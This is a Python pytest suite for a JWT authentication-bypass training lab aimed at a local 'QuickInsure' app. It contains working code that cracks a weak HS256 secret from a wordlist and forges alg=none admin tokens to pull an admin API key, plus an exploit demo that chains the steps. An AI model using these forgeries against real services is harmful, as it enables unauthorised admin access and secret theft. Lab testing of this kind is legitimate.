#!/usr/bin/env python3
"""
JWT Authentication Bypass Lab - Automated Tests
Tests the JWT vulnerabilities in the QuickInsure application
"""

import pytest
import requests
import jwt
import json
import time
from urllib.parse import urljoin

class TestJWTVulnerability:
    """Test suite for JWT authentication bypass vulnerabilities"""
    
    def setup_method(self):
        """Setup test environment"""
        self.base_url = "http://localhost:3206"
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'JWT-Test-Suite/1.0'
        })
    
    def test_application_accessible(self):
        """Test that the application is running and accessible"""
        response = self.session.get(self.base_url)
        assert response.status_code == 200
        assert "QuickInsure" in response.text
    
    def test_login_functionality(self):
        """Test normal login functionality"""
        login_data = {
            "username": "john.doe",
            "password": "Welcome2024!"
        }
        
        response = self.session.post(
            urljoin(self.base_url, "/api/login"),
            json=login_data
        )
        
        assert response.status_code == 200
        data = response.json()
        assert "access_token" in data
        assert data["role"] == "user"
        
        return data["access_token"]
    
    def test_admin_login(self):
        """Test admin login functionality"""
        login_data = {
            "username": "admin",
            "password": "xK9#mP2$vL8@nQ4&jR7!hF5*wE3"
        }
        
        response = self.session.post(
            urljoin(self.base_url, "/api/login"),
            json=login_data
        )
        
        assert response.status_code == 200
        data = response.json()
        assert "access_token" in data
        assert data["role"] == "admin"
        
        return data["access_token"]
    
    def test_jwt_structure_analysis(self):
        """Test JWT token structure and identify vulnerabilities"""
        token = self.test_login_functionality()
        
        # Decode JWT without verification
        decoded = jwt.decode(token, options={"verify_signature": False})
        
        # Check for expected claims
        assert "sub" in decoded
        assert "role" in decoded
        assert "user_id" in decoded
        
        # Check algorithm
        header = jwt.get_unverified_header(token)
        assert header["alg"] == "HS256"
        
        return decoded, header
    
    def test_weak_secret_cracking(self):
        """Test that the JWT secret is weak and crackable"""
        token = self.test_login_functionality()
        
        # Common weak secrets to test
        weak_secrets = ["secret", "admin", "quickinsure", "password", "123456"]
        
        for secret in weak_secrets:
            try:
                decoded = jwt.decode(token, secret, algorithms=["HS256"])
                print(f"âœ… Weak secret found: '{secret}'")
                return secret
            except jwt.InvalidSignatureError:
                continue
        
        pytest.fail("No weak secret found - this might indicate the vulnerability was fixed")
    
    def test_token_forgery_with_weak_secret(self):
        """Test forging admin token using weak secret"""
        weak_secret = self.test_weak_secret_cracking()
        
        # Create forged admin payload
        forged_payload = {
            "sub": "admin",
            "role": "admin",
            "user_id": 2,
            "exp": int(time.time()) + 3600  # 1 hour expiration
        }
        
        # Sign with weak secret
        forged_token = jwt.encode(forged_payload, weak_secret, algorithm="HS256")
        
        # Test the forged token
        headers = {"Authorization": f"Bearer {forged_token}"}
        response = self.session.get(
            urljoin(self.base_url, "/api/admin/system-config"),
            headers=headers
        )
        
        assert response.status_code == 200
        data = response.json()
        assert "admin_api_key" in data
        assert data["admin_api_key"] == "sk_live_quickinsure_admin_2024_xK9mP2vL8nQ4jR7hF5wE3"
        
        return forged_token
    
    def test_alg_none_vulnerability(self):
        """Test alg=none vulnerability"""
        # Create payload for alg=none attack
        payload = {
            "sub": "admin",
            "role": "admin",
            "user_id": 2,
            "exp": int(time.time()) + 3600
        }
        
        # Create JWT with alg=none (no signature)
        header = {"alg": "none", "typ": "JWT"}
        alg_none_token = jwt.encode(payload, "", algorithm="none")
        
        # Test the alg=none token
        headers = {"Authorization": f"Bearer {alg_none_token}"}
        response = self.session.get(
            urljoin(self.base_url, "/api/admin/system-config"),
            headers=headers
        )
        
        assert response.status_code == 200
        data = response.json()
        assert "admin_api_key" in data
        assert data["admin_api_key"] == "sk_live_quickinsure_admin_2024_xK9mP2vL8nQ4jR7hF5wE3"
        
        return alg_none_token
    
    def test_admin_endpoints_access(self):
        """Test access to admin endpoints with forged tokens"""
        # Test with weak secret forged token
        weak_secret_token = self.test_token_forgery_with_weak_secret()
        
        # Test admin users endpoint
        headers = {"Authorization": f"Bearer {weak_secret_token}"}
        response = self.session.get(
            urljoin(self.base_url, "/api/admin/user-management"),
            headers=headers
        )
        
        assert response.status_code == 200
        data = response.json()
        assert "users" in data
        assert len(data["users"]) > 0
        
        # Test alg=none token
        alg_none_token = self.test_alg_none_vulnerability()
        
        headers = {"Authorization": f"Bearer {alg_none_token}"}
        response = self.session.get(
            urljoin(self.base_url, "/api/admin/user-management"),
            headers=headers
        )
        
        assert response.status_code == 200
        data = response.json()
        assert "users" in data
    
    def test_user_endpoints_with_forged_tokens(self):
        """Test user endpoints with forged tokens"""
        weak_secret = self.test_weak_secret_cracking()
        
        # Create forged user token
        forged_payload = {
            "sub": "john.doe",
            "role": "user",
            "user_id": 1,
            "exp": int(time.time()) + 3600
        }
        
        forged_token = jwt.encode(forged_payload, weak_secret, algorithm="HS256")
        
        # Test user profile endpoint
        headers = {"Authorization": f"Bearer {forged_token}"}
        response = self.session.get(
            urljoin(self.base_url, "/api/user/profile"),
            headers=headers
        )
        
        assert response.status_code == 200
        data = response.json()
        assert "username" in data
        assert data["username"] == "john.doe"
    
    def test_invalid_tokens_rejected(self):
        """Test that invalid tokens are properly rejected"""
        # Test with invalid token
        headers = {"Authorization": "Bearer invalid_token"}
        response = self.session.get(
            urljoin(self.base_url, "/api/user/profile"),
            headers=headers
        )
        
        assert response.status_code in [401, 422]  # Should be rejected
    
    def test_api_key_retrieval(self):
        """Test that the admin API key can be retrieved through the vulnerability"""
        # Use alg=none attack to get API key
        alg_none_token = self.test_alg_none_vulnerability()
        
        headers = {"Authorization": f"Bearer {alg_none_token}"}
        response = self.session.get(
            urljoin(self.base_url, "/api/admin/system-config"),
            headers=headers
        )
        
        assert response.status_code == 200
        data = response.json()
        
        # Verify API key format and content
        assert "admin_api_key" in data
        api_key = data["admin_api_key"]
        assert api_key.startswith("sk_live_")
        assert "quickinsure_admin_2024" in api_key
        
        print(f"ğŸ‰ Admin API key retrieved successfully: {api_key}")
        return api_key

def run_exploit_demo():
    """Run a complete exploit demonstration"""
    print("ğŸš€ Starting JWT Authentication Bypass Exploit Demo")
    print("=" * 50)
    
    tester = TestJWTVulnerability()
    tester.setup_method()
    
    try:
        # Step 1: Verify application is accessible
        print("1. Testing application accessibility...")
        tester.test_application_accessible()
        print("   âœ… Application is accessible")
        
        # Step 2: Get normal user token
        print("2. Getting normal user token...")
        user_token = tester.test_login_functionality()
        print(f"   âœ… User token obtained: {user_token[:20]}...")
        
        # Step 3: Analyze JWT structure
        print("3. Analyzing JWT structure...")
        decoded, header = tester.test_jwt_structure_analysis()
        print(f"   âœ… JWT algorithm: {header['alg']}")
        print(f"   âœ… JWT payload: {json.dumps(decoded, indent=2)}")
        
        # Step 4: Crack weak secret
        print("4. Cracking weak JWT secret...")
        weak_secret = tester.test_weak_secret_cracking()
        print(f"   âœ… Weak secret found: '{weak_secret}'")
        
        # Step 5: Test alg=none vulnerability
        print("5. Testing alg=none vulnerability...")
        alg_none_token = tester.test_alg_none_vulnerability()
        print(f"   âœ… alg=none attack successful")
        
        # Step 6: Retrieve API key
        print("6. Retrieving admin API key...")
        api_key = tester.test_api_key_retrieval()
        print(f"   âœ… API Key: {api_key}")
        
        print("\nğŸ‰ Exploit completed successfully!")
        print("=" * 50)
        
        return True
        
    except Exception as e:
        print(f"âŒ Exploit failed: {e}")
        return False

if __name__ == "__main__":
    # Run the exploit demo
    success = run_exploit_demo()
    exit(0 if success else 1) 